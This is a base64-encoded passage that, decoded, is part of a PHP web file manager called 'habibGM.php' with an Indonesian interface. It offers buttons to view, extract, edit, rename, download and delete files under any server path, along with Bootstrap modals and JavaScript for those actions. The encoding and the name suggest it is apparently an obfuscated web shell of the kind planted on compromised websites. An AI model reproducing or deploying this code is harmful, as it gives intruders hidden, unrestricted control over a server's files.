mlldy1hcmNoaXZlLWJ0bicgZGF0YS1maWxlbmFtZT0nIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGl0ZW0pIC4gIic+TGloYXQ8L2J1dHRvbj4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpbl9hcnJheShzdHJ0b2xvd2VyKCRmaWxlRXh0ZW5zaW9uKSwgWyd6aXAnLCAndGFyJywgJ2d6JywgJ3RneiddKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPGEgaHJlZj0naGFiaWJHTS5waHA/ZXh0cmFjdD0iIC4gdXJsZW5jb2RlKCRpdGVtKSAuICImcGF0aD0iIC4gdXJsZW5jb2RlKCRkaXIpIC4gIicgY2xhc3M9J2J0biBidG4tc20gYnRuLXNlY29uZGFyeSBtZS0yJyBvbmNsaWNrPSdyZXR1cm4gY29uZmlybShcIkFwYWthaCBBbmRhIHlha2luIGluZ2luIG1lbmdla3N0cmFrIGZpbGUgaW5pP1wiKSc+RWtzdHJhazwvYT4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9J2VkaXQucGhwP2ZpbGU9IiAuIHVybGVuY29kZSgkaXRlbSkgLiAiJnBhdGg9IiAuIHVybGVuY29kZSgkZGlyKSAuICInIGNsYXNzPSdidG4gYnRuLXNtIGJ0bi1pbmZvIG1lLTInPkVkaXQ8L2E+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyAiPGJ1dHRvbiBjbGFzcz0nYnRuIGJ0bi1zbSBidG4td2FybmluZyBtZS0yIHJlbmFtZS1idG4nIGRhdGEtb2xkLW5hbWU9JyIgLiBodG1sc3BlY2lhbGNoYXJzKCRpdGVtKSAuICInPkdhbnRpIE5hbWE8L2J1dHRvbj4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8YSBocmVmPSdoYWJpYkdNLnBocD9kb3dubG9hZD0iIC4gdXJsZW5jb2RlKCRpdGVtKSAuICImcGF0aD0iIC4gdXJsZW5jb2RlKCRkaXIpIC4gIicgY2xhc3M9J2J0biBidG4tc20gYnRuLXN1Y2Nlc3MgbWUtMic+VW5kdWg8L2E+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gSGFwdXMgcGVuZ2VjZWthbiBwZXJhbiBkaSBzaW5pDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjxhIGhyZWY9J2hhYmliR00ucGhwP2RlbGV0ZT0iIC4gdXJsZW5jb2RlKCRpdGVtKSAuICImcGF0aD0iIC4gdXJsZW5jb2RlKCRkaXIpIC4gIicgY2xhc3M9J2J0biBidG4tc20gYnRuLWRhbmdlcicgb25jbGljaz0ncmV0dXJuIGNvbmZpcm0oXCJBcGFrYWggQW5kYSB5YWtpbiBpbmdpbiBtZW5naGFwdXMgZmlsZSBpbmk/XCIpJz5IYXB1czwvYT4iOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvICI8L3RkPiI7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gIjwvdHI+IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgPz4NCiAgICAgICAgICAgICAgICA8L3Rib2R5Pg0KICAgICAgICAgICAgPC90YWJsZT4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQoNCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0icmVuYW1lTW9kYWwiIHRhYmluZGV4PSItMSIgYXJpYS1sYWJlbGxlZGJ5PSJyZW5hbWVNb2RhbExhYmVsIiBhcmlhLWhpZGRlbj0idHJ1ZSI+DQogICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50IGdlbGFzIj4NCiAgICAgICAgICA8Zm9ybSBpZD0icmVuYW1lRm9ybSIgbWV0aG9kPSJwb3N0IiBhY3Rpb249ImhhYmliR00ucGhwP3BhdGg9PD9waHAgZWNobyB1cmxlbmNvZGUoJGRpcik7ID8+Ij4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciI+DQogICAgICAgICAgICAgIDxoNSBjbGFzcz0ibW9kYWwtdGl0bGUiIGlkPSJyZW5hbWVNb2RhbExhYmVsIj5HYW50aSBOYW1hPC9oNT4NCiAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4tY2xvc2UiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj48L2J1dHRvbj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSI+DQogICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJlbmFtZV9vbGRfbmFtZSIgaWQ9InJlbmFtZU9sZE5hbWUiPg0KICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtYi0zIj4NCiAgICAgICAgICAgICAgICA8bGFiZWwgZm9yPSJyZW5hbWVOZXdOYW1lIiBjbGFzcz0iZm9ybS1sYWJlbCI+TmFtYSBCYXJ1PC9sYWJlbD4NCiAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCBnZWxhcyIgaWQ9InJlbmFtZU5ld05hbWUiIG5hbWU9InJlbmFtZV9uZXdfbmFtZSIgcmVxdWlyZWQ+DQogICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1mb290ZXIiPg0KICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IiBkYXRhLWJzLWRpc21pc3M9Im1vZGFsIj5CYXRhbDwvYnV0dG9uPg0KICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U2ltcGFuPC9idXR0b24+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICA8L2Zvcm0+DQogICAgICAgIDwvZGl2Pg0KICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQoNCiAgICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0iaW1hZ2VNb2RhbCIgdGFiaW5kZXg9Ii0xIiBhcmlhLWxhYmVsbGVkYnk9ImltYWdlTW9kYWxMYWJlbCIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2cgbW9kYWwtbGcgbW9kYWwtZGlhbG9nLWNlbnRlcmVkIj4NCiAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQgZ2VsYXMiPg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciBib3JkZXItYm90dG9tLTAiPg0KICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIiBpZD0iaW1hZ2VNb2RhbExhYmVsIj5QcmF0aW5qYXUgR2FtYmFyPC9oNT4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4tY2xvc2UiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5IHRleHQtY2VudGVyIj4NCiAgICAgICAgICAgICAgICAgICAgPGltZyBpZD0iaW1hZ2VQcmV2aWV3IiBzcmM9IiIgY2xhc3M9ImltZy1mbHVpZCIgYWx0PSJQcmF0aW5qYXUgR2FtYmFyIj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICA8L2Rpdj4NCiAgICA8L2Rpdj4NCg0KICAgIDxkaXYgY2xhc3M9Im1vZGFsIGZhZGUiIGlkPSJ2aWRlb01vZGFsIiB0YWJpbmRleD0iLTEiIGFyaWEtbGFiZWxsZWRieT0idmlkZW9Nb2RhbExhYmVsIiBhcmlhLWhpZGRlbj0idHJ1ZSI+DQogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyBtb2RhbC1sZyBtb2RhbC1kaWFsb2ctY2VudGVyZWQiPg0KICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCBnZWxhcyI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIGJvcmRlci1ib3R0b20tMCI+DQogICAgICAgICAgICAgICAgICAgIDxoNSBjbGFzcz0ibW9kYWwtdGl0bGUiIGlkPSJ2aWRlb01vZGFsTGFiZWwiPlByYXRpbmphdSBWaWRlbzwvaDU+DQogICAgICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuLWNsb3NlIiBkYXRhLWJzLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+PC9idXR0b24+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSI+DQogICAgICAgICAgICAgICAgICAgIDx2aWRlbyBpZD0idmlkZW9QbGF5ZXIiIGNsYXNzPSJ3LTEwMCIgY29udHJvbHM+DQogICAgICAgICAgICAgICAgICAgICAgICBZb3VyIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCB0aGUgdmlkZW8gdGFnLg0KICAgICAgICAgICAgICAgICAgICA8L3ZpZGVvPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KDQogICAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9ImF1ZGlvTW9kYWwiIHRhYmluZGV4PSItMSIgYXJpYS1sYWJlbGxlZGJ5PSJhdWRpb01vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIG1vZGFsLWRpYWxvZy1jZW50ZXJlZCI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50IGdlbGFzIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIgYm9yZGVyLWJvdHRvbS0wIj4NCiAgICAgICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSIgaWQ9ImF1ZGlvTW9kYWxMYWJlbCI+UHJhdGluamF1IEF1ZGlvPC9oNT4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4tY2xvc2UiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiIGFyaWEtbGFiZWw9IkNsb3NlIj48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5Ij4NCiAgICAgICAgICAgICAgICAgICAgPGF1ZGlvIGlkPSJhdWRpb1BsYXllciIgY2xhc3M9InctMTAwIiBjb250cm9scz4NCiAgICAgICAgICAgICAgICAgICAgICAgIFlvdXIgYnJvd3NlciBkb2VzIG5vdCBzdXBwb3J0IHRoZSBhdWRpbyBlbGVtZW50Lg0KICAgICAgICAgICAgICAgICAgICA8L2F1ZGlvPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICA8ZGl2IGNsYXNzPSJtb2RhbCBmYWRlIiBpZD0iYXJjaGl2ZU1vZGFsIiB0YWJpbmRleD0iLTEiIGFyaWEtbGFiZWxsZWRieT0iYXJjaGl2ZU1vZGFsTGFiZWwiIGFyaWEtaGlkZGVuPSJ0cnVlIj4NCiAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2ciPg0KICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50IGdlbGFzIj4NCiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iaGFiaWJHTS5waHA/cGF0aD08P3BocCBlY2hvIHVybGVuY29kZSgkZGlyKTsgPz4iIG1ldGhvZD0icG9zdCIgaWQ9ImFyY2hpdmVGb3JtIj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIiBpZD0iYXJjaGl2ZU1vZGFsTGFiZWwiPkFyc2lwa2FuIEl0ZW08L2g1Pg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0bi1jbG9zZSIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPg0KICAgICAgICAgICAgICAgICAgICA8cD5BcGFrYWggQW5kYSB5YWtpbiBpbmdpbiBtZW5nYXJzaXBrYW4gaXRlbSB5YW5nIGRpcGlsaWg/PC9wPg0KICAgICAgICAgICAgICAgICAgICA8dWwgaWQ9ImFyY2hpdmUtbGlzdCIgY2xhc3M9Imxpc3QtZ3JvdXAgbWItMyI+PC91bD4NCiAgICAgICAgICAgICAgICAgICAgPGRpdiBpZD0iYXJjaGl2ZS1pbnB1dHMtY29udGFpbmVyIj48L2Rpdj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1mb290ZXIiPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc2Vjb25kYXJ5IiBkYXRhLWJzLWRpc21pc3M9Im1vZGFsIj5CYXRhbDwvYnV0dG9uPg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+QXJzaXBrYW48L2J1dHRvbj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9ImRlbGV0ZU1vZGFsIiB0YWJpbmRleD0iLTEiIGFyaWEtbGFiZWxsZWRieT0iZGVsZXRlTW9kYWxMYWJlbCIgYXJpYS1oaWRkZW49InRydWUiPg0KICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyI+DQogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQgZ2VsYXMiPg0KICAgICAgICAgICAgPGZvcm0gYWN0aW9uPSJoYWJpYkdNLnBocD9wYXRoPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRkaXIpOyA/PiIgbWV0aG9kPSJwb3N0IiBpZD0iZGVsZXRlRm9ybSI+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4NCiAgICAgICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSIgaWQ9ImRlbGV0ZU1vZGFsTGFiZWwiPkhhcHVzIEl0ZW08L2g1Pg0KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0bi1jbG9zZSIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPjwvYnV0dG9uPg0KICAgICAgICAgICAgICAgIDwvZGl2Pg0KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWJvZHkiPg0KICAgICAgICAgICAgICAgICAgICA8cD5BbmRhIHlha2luIGluZ2luIG1lbmdoYXB1cyBpdGVtLWl0ZW0gYmVyaWt1dD8gVGluZGFrYW4gaW5pIHRpZGFrIGRhcGF0IGRpYmF0YWxrYW4uPC9wPg0KICAgICAgICAgICAgICAgICAgICA8dWwgaWQ9ImRlbGV0ZS1saXN0IiBjbGFzcz0ibGlzdC1ncm91cCBtYi0zIj48L3VsPg0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGlkPSJkZWxldGUtaW5wdXRzLWNvbnRhaW5lciI+PC9kaXY+DQogICAgICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtZm9vdGVyIj4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLXNlY29uZGFyeSIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCI+QmF0YWw8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLWRhbmdlciI+SGFwdXM8L2J1dHRvbj4NCiAgICAgICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgICAgIDwvZm9ybT4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8L2Rpdj4NCiAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9ImFyY2hpdmVWaWV3ZXJNb2RhbCIgdGFiaW5kZXg9Ii0xIiBhcmlhLWxhYmVsbGVkYnk9ImFyY2hpdmVWaWV3ZXJNb2RhbExhYmVsIiBhcmlhLWhpZGRlbj0idHJ1ZSI+DQogICAgPGRpdiBjbGFzcz0ibW9kYWwtZGlhbG9nIG1vZGFsLWxnIG1vZGFsLWRpYWxvZy1zY3JvbGxhYmxlIj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCBnZWxhcyI+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPg0KICAgICAgICAgICAgICAgIDxoNSBjbGFzcz0ibW9kYWwtdGl0bGUiIGlkPSJhcmNoaXZlVmlld2VyTW9kYWxMYWJlbCI+SXNpIEFyc2lwPC9oNT4NCiAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0bi1jbG9zZSIgZGF0YS1icy1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPjwvYnV0dG9uPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5Ij4NCiAgICAgICAgICAgICAgICA8dWwgaWQ9ImFyY2hpdmUtY29udGVudHMtbGlzdCIgY2xhc3M9Imxpc3QtZ3JvdXAiPg0KICAgICAgICAgICAgICAgICAgICA8L3VsPg0KICAgICAgICAgICAgPC9kaXY+DQogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1mb290ZXIiPg0KICAgICAgICAgICAgICAgIDxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1zZWNvbmRhcnkiIGRhdGEtYnMtZGlzbWlzcz0ibW9kYWwiPlR1dHVwPC9idXR0b24+DQogICAgICAgICAgICA8L2Rpdj4NCiAgICAgICAgPC9kaXY+DQogICAgPC9kaXY+DQo8L2Rpdj4NCg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjMuMi9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4NCiAgICA8c2NyaXB0Pg0KICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbiAoKSB7DQogICAgICAgIC8vIFJlbmFtaW5nIE1vZGFsIExvZ2ljDQogICAgICAgIGNvbnN0IHJlbmFtZU1vZGFsID0gbmV3IGJvb3RzdHJhcC5Nb2RhbChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVuYW1lTW9kYWwnKSk7DQogICAgICAgIGNvbnN0IHJlbmFtZUZvcm0gPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVuYW1lRm9ybScpOw0KICAgICAgICBjb25zdCByZW5hbWVPbGROYW1lSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVuYW1lT2xkTmFtZScpOw0KICAgICAgICBjb25zdCByZW5hbWVOZXdOYW1lSW5wdXQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVuYW1lTmV3TmFtZScpOw0KDQogICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5yZW5hbWUtYnRuJykuZm9yRWFjaChidXR0b24gPT4gew0KICAgICAgICAgICAgYnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkgew0KICAgICAgICAgICAgICAgIGNvbnN0IG9sZE5hbWUgPSB0aGlzLmdldEF0dHJpYnV0ZSgnZGF0YS1vbGQtbmFtZScpOw0KICAgICAgICAgICAgICAgIHJlbmFtZU9sZE5hbWVJbnB1dC52YWx1ZSA9IG9sZE5hbWU7DQogICAgICAgICAgICAgICAgcmVuYW1lTmV3TmFtZUlucHV0LnZhbHVlID0gb2xkTmFtZTsNCiAgICAgICAgICAgICAgICByZW5hbWVNb2RhbC5zaG93KCk7DQogICAgICAgICAgICB9KTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgLy8gQXV0by1kaXNtaXNzIGFsZXJ0DQogICAgICAgIHZhciBteUFsZXJ0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ215QWxlcnQnKTsNCiAgICAgICAgaWYgKG15QWxlcnQpIHsNCiAgICAgICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgdmFyIGJzQWxlcnQgPSBuZXcgYm9vdHN0cmFwLkFsZXJ0KG15QWxlcnQpOw0KICAgICAgICAgICAgICAgIGJzQWxlcnQuY2xvc2UoKTsNCiAgICAgICAgICAgIH0sIDMwMDApOw0KDQogICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgew0KICAgICAgICAgICAgICAgIGNvbnN0IHVybCA9IG5ldyBVUkwod2luZG93LmxvY2F0aW9uLmhyZWYpOw0KICAgICAgICAgICAgICAgIHVybC5zZWFyY2hQYXJhbXMuZGVsZXRlKCdhbGVydF9tZXNzYWdlJyk7DQogICAgICAgICAgICAgICAgdXJsLnNlYXJjaFBhcmFtcy5kZWxldGUoJ2FsZXJ0X3N0YXR1cycpOw0KICAgICAgICAgICAgICAgIHdpbmRvdy5oaXN0b3J5LnJlcGxhY2VTdGF0ZSh7fSwgZG9jdW1lbnQudGl0bGUsIHVybCk7DQogICAgICAgICAgICB9LCAzNTAwKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIEltYWdlIFByZXZpZXcgTW9kYWwgTG9naWMNCiAgICAgICAgY29uc3QgaW1hZ2VNb2RhbCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbWFnZU1vZGFsJyk7DQogICAgICAgIGNvbnN0IGltYWdlUHJldmlldyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpbWFnZVByZXZpZXcnKTsNCg0KICAgICAgICBpbWFnZU1vZGFsLmFkZEV2ZW50TGlzdGVuZXIoJ3Nob3cuYnMubW9kYWwnLCBmdW5jdGlvbiAoZXZlbnQpIHsNCiAgICAgICAgICAgIGNvbnN0IGxpbmsgPSBldmVudC5yZWxhdGVkVGFyZ2V0Ow0KICAgICAgICAgICAgY29uc3QgaW1hZ2VQYXRoID0gbGluay5nZXRBdHRyaWJ1dGUoJ2RhdGEtaW1hZ2UtcGF0aCcpOw0KICAgICAgICAgICAgaW1hZ2VQcmV2aWV3LnNyYyA9IGltYWdlUGF0aDsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgLy8gVmlkZW8gUGxheWVyIE1vZGFsIExvZ2ljDQogICAgICAgIGNvbnN0IHZpZGVvTW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndmlkZW9Nb2RhbCcpOw0KICAgICAgICBjb25zdCB2aWRlb1BsYXllciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd2aWRlb1BsYXllcicpOw0KDQogICAgICAgIHZpZGVvTW9kYWwuYWRkRXZlbnRMaXN0ZW5lcignc2hvdy5icy5tb2RhbCcsIGZ1bmN0aW9uIChldmVudCkgew0KICAgICAgICAgICAgY29uc3QgbGluayA9IGV2ZW50LnJlbGF0ZWRUYXJnZXQ7DQogICAgICAgICAgICBjb25zdCB2aWRlb1BhdGggPSBsaW5rLmdldEF0dHJpYnV0ZSgnZGF0YS12aWRlby1wYXRoJyk7DQogICAgICAgICAgICB2aWRlb1BsYXllci5zcmMgPSB2aWRlb1BhdGg7DQogICAgICAgICAgICB2aWRlb1BsYXllci5sb2FkKCk7IC8vIE1lbXVhdCB1bGFuZyB2aWRlbw0KICAgICAgICAgICAgdmlkZW9QbGF5ZXIucGxheSgpOyAvLyBNZW11bGFpIHBlbXV0YXJhbiB2aWRlbw0KICAgICAgICB9KTsNCg0KICAgICAgICB2aWRlb01vZGFsLmFkZEV2ZW50TGlzdGVuZXIoJ2hpZGUuYnMubW9kYWwnLCBmdW5jdGlvbiAoKSB7DQogICAgICAgICAgICB2aWRlb1BsYXllci5wYXVzZSgpOyAvLyBNZW5naGVudGlrYW4gdmlkZW8gc2FhdCBtb2RhbCBkaXR1dHVwDQogICAgICAgICAgICB2aWRlb1BsYXllci5jdXJyZW50VGltZSA9IDA7IC8vIE1lbmdhdHVyIHVsYW5nIHdha3R1IHZpZGVvDQogICAgICAgIH0pOw0KICAgICAgICANCiAgICAgICAgLy8gQXVkaW8gUGxheWVyIE1vZGFsIExvZ2ljDQogICAgICAgIGNvbnN0IGF1ZGlvTW9kYWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXVkaW9Nb2RhbCcpOw0KICAgICAgICBjb25zdCBhdWRpb1BsYXllciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhdWRpb1BsYXllcicpOw0KDQogICAgICAgIGF1ZGlvTW9kYWwuYWRkRXZlbnRMaXN0ZW5lcignc2hvdy5icy5tb2RhbCcsIGZ1bmN0aW9uIChldmVudCkgew0KICAgICAgICAgICAgY29uc3QgbGluayA9IGV2ZW50LnJlbGF0ZWRUYXJnZXQ7DQogICAgICAgICAgICBjb25zdCBhdWRpb1BhdGggPSBsaW5rLmdldEF0dHJpYnV0ZSgnZGF0YS1hdWRpby1wYXRoJyk7DQogICAgICAgICAgICBhdWRpb1BsYXllci5zcmMgPSBhdWRpb1BhdGg7DQogICAgICAgICAgICBhdWRpb1BsYXllci5sb2FkKCk7IC8vIE1lbXVhdCB1bGFuZyBhdWRpbw0KICAgICAgICAgICAgYXVkaW9QbGF5ZXIucGxheSgpOyAvLyBNZW11bGFpIHBlbXV0YXJhbiBhdWRpbw0KICAgICAgICB9KTsNCiAgLy8gTG9naWthIHVudHVrIGZpdHVyIEFyc2lwDQogICAgY29uc3QgYXJjaGl2ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhcmNoaXZlLWJ0bicpOw0KICAgIGNvbnN0IGRlbGV0ZUJ0biA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkZWxldGUtc2VsZWN0ZWQtYnRuJyk7DQogICAgY29uc3QgaXRlbUNoZWNrYm94ZXMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuaXRlbS1jaGVja2JveCcpOw0KICAgIGNvbnN0IHNlbGVjdEFsbENoZWNrYm94ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NlbGVjdC1hbGwtY2hlY2tib3gnKTsNCiAgICBjb25zdCBhcmNoaXZlTW9kYWwgPSBuZXcgYm9vdHN0cmFwLk1vZGFsKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhcmNoaXZlTW9kYWwnKSk7DQogICAgY29uc3QgYXJjaGl2ZUxpc3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYXJjaGl2ZS1saXN0Jyk7DQogICAgY29uc3QgYXJjaGl2ZUlucHV0c0NvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhcmNoaXZlLWlucHV